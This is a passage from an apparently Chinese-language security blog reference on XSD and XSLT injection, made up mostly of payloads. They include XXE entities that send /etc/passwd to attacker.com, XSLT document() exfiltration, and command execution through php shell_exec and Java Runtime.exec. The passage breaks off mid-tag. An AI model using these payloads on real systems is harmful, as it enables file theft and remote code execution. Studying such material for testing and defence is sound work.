href="https://www.w3school.com.cn/xquery/index.asp">w3school</a></p><h2 id="XSD- 注入"><a href="#XSD- 注入" class="headerlink" title="XSD 注入"></a>XSD 注入</h2><p>XSD (XML Schema Definition) 是一种用来描述 XML 文档元素的定义方法，可以用来代替 DTD，比 DTD 更加强大，功能也更多。更多 XSD 知识，请参考 <a href="https://www.w3school.com.cn/schema/index.asp">w3school</a></p><h3 id="XSD-schemaLocation"><a href="#XSD-schemaLocation" class="headerlink" title="XSD schemaLocation"></a>XSD schemaLocation</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">data</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    % remote;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ttt:data</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:ttt</span>=<span class="string">&quot;http://attacker.com/attack&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;ttt http://attacker.com/<span class="symbol">&amp;internal;</span>&quot;</span>&gt;</span>4<span class="tag">&lt;/<span class="name">ttt:data</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中 <code>evil.dtd</code> 中的内容为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">payload</span> <span class="keyword">SYSTEM</span> “file:///etc/passwd”&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">param1</span> “&lt;!ENTITY <span class="keyword">internal</span> ‘% payload;’&gt;</span>”&gt;</span><br><span class="line">% param1;</span><br></pre></td></tr></table></figure><h3 id="XSD-noNamespaceSchemaLocation"><a href="#XSD-noNamespaceSchemaLocation" class="headerlink" title="XSD noNamespaceSchemaLocation"></a>XSD noNamespaceSchemaLocation</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">data</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    % remote;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">”http://www.w3.org/2001/XMLSchema-instance”</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:noNamespaceSchemaLocation</span>=<span class="string">”http://attacker.com/&amp;internal;”</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中 <code>evil.dtd</code> 中的内容为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">payload</span> <span class="keyword">SYSTEM</span> “file:///etc/passwd”&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">param1</span> “&lt;!ENTITY <span class="keyword">internal</span> ‘% payload;’&gt;</span>”&gt;</span><br><span class="line">% param1;</span><br></pre></td></tr></table></figure><h3 id="XSD-Include-import"><a href="#XSD-Include-import" class="headerlink" title="XSD Include/import"></a>XSD Include/import</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xs:schema</span> <span class="attr">elementFormDefault</span>=<span class="string">&quot;qualified&quot;</span> <span class="attr">xmlns:xs</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> <span class="attr">xmlns:myNS</span>=<span class="string">&quot;myNS&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xs:import</span> <span class="attr">namespace</span>=<span class="string">&quot;myNS&quot;</span> <span class="attr">schemaLocation</span>=<span class="string">&quot;http://attacker.com/evil.xsd&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xs:include</span> <span class="attr">namespace</span>=<span class="string">&quot;myNS2&quot;</span> <span class="attr">schemaLocation</span>=<span class="string">&quot;http://attacker.com/evil.xsd&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xs:schema</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XInclude"><a href="#XInclude" class="headerlink" title="XInclude"></a>XInclude</h3><blockquote><p>XInclude 需要手动开启。</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">data</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attacker.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    % remote;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xi</span>=<span class="string">”http://www.w3.org/2001/XInclude”</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">”http://attacker.com/&amp;internal;”</span> <span class="attr">parse</span>=<span class="string">”text”</span>&gt;</span><span class="tag">&lt;/<span class="name">xi:include</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中 <code>evil.dtd</code> 中的内容为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">payload</span> <span class="keyword">SYSTEM</span> “file:///etc/passwd”&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">param1</span> “&lt;!ENTITY <span class="keyword">internal</span> ‘% payload;’&gt;</span>”&gt;</span><br><span class="line">% param1;</span><br></pre></td></tr></table></figure><h3 id="XSD- 报错"><a href="#XSD- 报错" class="headerlink" title="XSD 报错"></a>XSD 报错</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xs:restriction</span> <span class="attr">base</span>=<span class="string">&quot;xs:string&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xs:pattern</span> <span class="attr">value</span>=<span class="string">&quot;<span class="symbol">&amp;xxe;</span>&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xs:restriction</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="XSLT- 注入"><a href="#XSLT- 注入" class="headerlink" title="XSLT 注入"></a>XSLT 注入</h2><p>XSLT (EXtensible Stylesheet Language Transform)，是一种扩展样式表转换语言，可以将 XML 转换为其他类型的语言。更多 XSLT 知识，请参考 <a href="https://www.w3school.com.cn/xsl/index.asp">w3school</a>。</p><h3 id="获取 -XSLT- 信息"><a href="# 获取 -XSLT- 信息" class="headerlink" title="获取 XSLT 信息"></a>获取 XSLT 信息</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">    XSLT Version: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;system-property (&#x27;xsl:version&#x27;)&quot;</span> /&gt;</span></span><br><span class="line">    XSLT Vendor: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;system-property (&#x27;xsl:vendor&#x27;)&quot;</span> /&gt;</span></span><br><span class="line">    XSLT Vendor URL: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;system-property (&#x27;xsl:version-url&#x27;)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XSLT-Stylesheet"><a href="#XSLT-Stylesheet" class="headerlink" title="XSLT Stylesheet"></a>XSLT Stylesheet</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=<span class="string">&quot;text/xsl&quot;</span> href=<span class="string">&quot;http://attacker.com/evil.xsl&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">doc</span>&gt;</span><span class="tag">&lt;/<span class="name">doc</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XSLT-Include-import"><a href="#XSLT-Include-import" class="headerlink" title="XSLT Include/import"></a>XSLT Include/import</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:import</span> <span class="attr">href</span>=<span class="string">&quot;http://attacker.com/evil.xsl&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:include</span> <span class="attr">href</span>=<span class="string">&quot;http://attacker.com/evil.xsl&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XSLT- 读取文件"><a href="#XSLT- 读取文件" class="headerlink" title="XSLT 读取文件"></a>XSLT 读取文件 </h3><p> 可读取合法的 xml 文件，或者普通文件的第一行</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;document (&#x27;test.xml&#x27;)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;document (&#x27;file:///secret.txt&#x27;)&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>将读取到的文件发送到远程服务器中：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;name1&quot;</span> <span class="attr">select</span>=<span class="string">&quot;document (&#x27;file:///etc/passwd&#x27;)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;name2&quot;</span> <span class="attr">select</span>=<span class="string">&quot;concat (&#x27;http://attacker.com/?&#x27;, $name1)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;name3&quot;</span> <span class="attr">select</span>=<span class="string">&quot;document ($name2)&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XSLT-RCE"><a href="#XSLT-RCE" class="headerlink" title="XSLT RCE"></a>XSLT RCE</h3><p>libxslt + php 环境：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:php</span>=<span class="string">&quot;http://php.net/xsl&quot;</span>&gt;</span></span><br><span class="line">          </span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:output</span> <span class="attr">method</span>=<span class="string">&quot;html&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;php:function (&#x27;shell_exec&#x27;, &#x27;sleep 10&#x27;)&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Xalan-Java 环境：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line">xmlns:runtime=&quot;http://xml.apache.org/xalan/java/java.lang.Runtime&quot;</span><br><span class="line">xmlns:process=&quot;http://xml.apache.org/xalan/java/java.lang.Process&quot;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;rtobject&quot;</span> <span class="attr">select</span>=<span class="string">&quot;runtime:getRuntime ()&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;process&quot;</span> <span class="attr">select</span>=<span class="string">&quot;runtime:exec ($rtobject, &#x27;sleep 5&#x27;)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;waiting&quot;</span> <span class="attr">select</span>=<span class="string">&quot;process:waitFor ($process)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;$process&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;osversion&quot;</span> <span class="attr">select</span>=<span class="string">&quot;jv:java.lang.System.getProperty (&#x27;oname&#x27;)&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;$osversion&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>Xalan 环境：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:jv</span>=<span class="string">&quot;http://xml.apache.org/xalan/java&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">exclude-result-prefixes</span>=<span class="string">&quot;jv&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;osversion&quot;</span> <span class="attr">select</span>=<span class="string">&quot;jv:java.lang.System.getProperty (&#x27;os.name&#x27;)&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;$osversion&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Saxon EE 环境：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:date</span>=<span class="string">&quot;java:java.util.Date&quot;</span> <span class="attr">xmlns:runtime</span>=<span class="string">&quot;java:java.lang.Runtime&quot;</span> <span class="attr">xmlns:process</span>=<span class="string">&quot;java:java.lang.Process&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:output</span> <span class="attr">method</span>=<span class="string">&quot;text&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">        Date: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;date:new ()&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;rtobject&quot;</span> <span class="attr">select</span>=<span class="string">&quot;runtime:getRuntime ()&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;process&quot;</span> <span class="attr">select</span>=<span class="string">&quot;runtime:exec ($rtobject, &#x27;sleep 5&#x27;)&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;waiting&quot;</span> <span class="attr">select</span>=<span class="string">&quot;process:waitFor ($process)&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;$process&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XSLT- 连接数据库"><a href="#XSLT- 连接数据库" class="headerlink" title="XSLT 连接数据库"></a>XSLT 连接数据库</h3><p>Xalan-Java 环境：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">select</span>= <span class="string">&quot;&#x27;com.mysql.jdbc.Driver&#x27;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">&quot;dbUrl&quot;</span> <span class="attr">select</span>=<span class="string">&quot;&#x27;jdbc:mysql://localhost/xslt&#x27;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">select</span>=<span class="string">&quot;&#x27;xsltuser&#x27;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">&quot;pw&quot;</span> <span class="attr">select</span>=<span class="string">&quot;&#x27;xsltpw&#x27;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">&quot;query&quot;</span> <span class="attr">select</span>=<span class="string">&quot;&#x27;select test from xtable&#x27;&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;dbc&quot;</span> <span class="attr">select</span>=<span class="string">&quot;sql:new ($driver, $dbUrl , $user, $pw)&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;table&quot;</span> <span class="attr">select</span>=<span class="string">&quot;sql:query ($dbc, $query)&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;$table/*&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;sql:close ($dbc)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XSLT- 写入文件"><a href="#XSLT- 写入文件" class="headerlink" title="XSLT 写入文件"></a>XSLT 写入文件 </h3><p> 若写入成功，则无任何输出，写入失败则报错。</p><p>Saxon 环境：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:result-document</span> <span class="attr">href</span>=<span class="string">&quot;local_file.txt&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:text</span>&gt;</span>Hello World to local file.<span class="tag">&lt;/<span class="name">xsl:text</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">xsl:result-document</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Xalan-Java 环境：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">redirect:open</span> <span class="attr">href</span>=<span class="string">&quot;local_file.txt&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">redirect:write</span> <span class="attr">href</span>=<span class="string">&quot;local_file.txt&quot;</span>&gt;</span>Hello world to local file.<span class="tag">&lt;/<span class="name">redirect:open</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">redirect:close</span> <span class="attr">href</span>=<span class="string">&quot;local_file.txt&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br></pre></td></tr></table></figure><p>libxslt 环境：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exsl:document</span> <span class="attr">href</span>=<span 